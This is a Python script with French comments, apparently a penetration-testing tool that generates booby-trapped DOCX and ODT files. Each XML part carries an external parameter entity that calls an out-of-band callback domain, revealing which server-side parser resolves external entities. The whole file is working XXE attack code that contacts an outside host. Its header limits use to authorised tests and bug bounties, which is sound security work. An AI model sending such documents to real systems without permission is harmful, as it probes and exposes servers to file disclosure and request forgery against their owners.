#!/usr/bin/env python3
"""
xxeup.py - generateur de documents OOXML / ODF piNULLges XXE OOB.

Usage legitime uniquement : tests d'intrusion autorises et bug bounty
sur un perimetre ou tu as l'autorisation ecrite.

Principe
--------
Chaque part XML du conteneur ZIP recoit un DOCTYPE avec une entite
parametre EXTERNE (<!ENTITY % oob SYSTEM "...">) suivie de sa reference
(%oob;). Si le parseur cote serveur resout les entites externes, il fait
une requete vers l'URL OAST au moment ou il lit cette part.

Un label OAST DISTINCT par part (sous-domaine + chemin) permet, a la
reception du callback, de savoir exactement quelle part a ete parsee -
donc quel composant serveur est vulnerable (extracteur de metadonnees,
convertisseur, generateur de miniature, indexeur, etc.).
"""

import argparse
import sys
import zipfile


# --------------------------------------------------------------------------
# Construction du payload
# --------------------------------------------------------------------------

def label_url(scheme, tag, base):
    """URL OAST identifiable en DNS (sous-domaine) ET en HTTP (chemin)."""
    return f"{scheme}://{tag}.{base}/{tag}"


def dtd(root_name, url):
    """DOCTYPE a entite parametre externe pointant vers `url`."""
    return (
        f"<!DOCTYPE {root_name} [\n"
        f'  <!ENTITY % oob SYSTEM "{url}">\n'
        f"  %oob;\n"
        f"]>"
    )


def inject(xml, root_name, url):
    """Insere le DOCTYPE juste apres la declaration <?xml ... ?>."""
    end = xml.index("?>") + 2
    return xml[:end] + "\n" + dtd(root_name, url) + xml[end:]


# --------------------------------------------------------------------------
# Gabarits des parts (scaffolding minimal mais valide)
# --------------------------------------------------------------------------

CONTENT_TYPES = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
    '<Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>'
    '</Types>'
)

RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
    '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>'
    '</Relationships>'
)

DOCUMENT = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    '<w:body><w:p><w:r><w:t>xxe</w:t></w:r></w:p></w:body>'
    '</w:document>'
)

CORE = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<cp:coreProperties '
    'xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
    'xmlns:dc="http://purl.org/dc/elements/1.1/">'
    '<dc:title>xxe</dc:title>'
    '</cp:coreProperties>'
)

# part de structure sans payload (aide a la validite OOXML)
DOC_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>'
)

CONTENT = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<office:document-content '
    'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
    'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" office:version="1.2">'
    '<office:body><office:text><text:p>xxe</text:p></office:text></office:body>'
    '</office:document-content>'
)

MANIFEST = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<manifest:manifest '
    'xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" '
    'manifest:version="1.2">'
    '<manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>'
    '<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>'
    '<manifest:file-entry manifest:full-path="styles.xml" manifest:media-type="text/xml"/>'
    '</manifest:manifest>'
)

# part de structure sans payload (aide a l'ouverture de l'ODT)
STYLES = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<office:document-styles '
    'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:version="1.2"/>'
)

# (arcname, tag/label, root element, gabarit)
DOCX_PARTS = [
    ("[Content_Types].xml", "ct",   "Types",             CONTENT_TYPES),
    ("_rels/.rels",         "rels", "Relationships",     RELS),
    ("word/document.xml",   "doc",  "w:document",        DOCUMENT),
    ("docProps/core.xml",   "core", "cp:coreProperties", CORE),
]

ODT_PARTS = [
    ("content.xml",           "content",  "office:document-content", CONTENT),
    ("META-INF/manifest.xml", "manifest", "manifest:manifest",       MANIFEST),
]


# --------------------------------------------------------------------------
# Ecriture des conteneurs
# --------------------------------------------------------------------------

def build_docx(path, base, scheme):
    mapping = []
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        for arcname, tag, root, tmpl in DOCX_PARTS:
            url = label_url(scheme, tag, base)
            z.writestr(arcname, inject(tmpl, root, url))
            mapping.append((arcname, url))
        z.writestr("word/_rels/document.xml.rels", DOC_RELS)
    return mapping


def build_odt(path, base, scheme):
    mapping = []
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        # 'mimetype' doit etre la 1re entree et stockee sans compression
        mt = zipfile.ZipInfo("mimetype")
        mt.compress_type = zipfile.ZIP_STORED
        z.writestr(mt, "application/vnd.oasis.opendocument.text")
        for arcname, tag, root, tmpl in ODT_PARTS:
            url = label_url(scheme, tag, base)
            z.writestr(arcname, inject(tmpl, root, url))
            mapping.append((arcname, url))
        z.writestr("styles.xml", STYLES)
    return mapping


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(
        description="Genere des documents piNULLges XXE OOB (tests autorises uniquement)."
    )
    ap.add_argument("--variant", required=True, choices=["oob-all", "odt"],
                    help="oob-all = DOCX (toutes les parts) ; odt = ODT")
    ap.add_argument("--oast", required=True, metavar="DOMAIN",
                    help="domaine OAST de base, ex: abcd1234.oast.fun / xxx.burpcollaborator.net")
    ap.add_argument("--scheme", default="http", choices=["http", "https"])
    ap.add_argument("-o", "--output", help="fichier de sortie")
    args = ap.parse_args()

    if args.variant == "oob-all":
        out = args.output or "xxe-oob-all.docx"
        mapping = build_docx(out, args.oast, args.scheme)
    else:
        out = args.output or "xxe-oob.odt"
        mapping = build_odt(out, args.oast, args.scheme)

    print(f"[+] {out} genere.")
    print("[+] Correspondance part -> label OAST a surveiller :")
    width = max(len(a) for a, _ in mapping)
    for arcname, url in mapping:
        print(f"    {arcname.ljust(width)}  ->  {url}")


if __name__ == "__main__":
    sys.exit(main())